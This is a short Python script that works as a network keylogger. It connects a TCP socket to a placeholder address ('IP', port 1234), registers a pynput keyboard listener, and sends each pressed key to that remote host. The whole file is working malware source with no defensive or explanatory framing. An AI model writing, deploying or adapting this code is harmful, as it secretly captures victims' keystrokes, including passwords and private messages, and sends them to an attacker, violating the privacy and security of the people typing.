import socket
from pynput import keyboard

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(('IP',1234))

def keyPressed(key):
    client.send(str(key).encode())

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
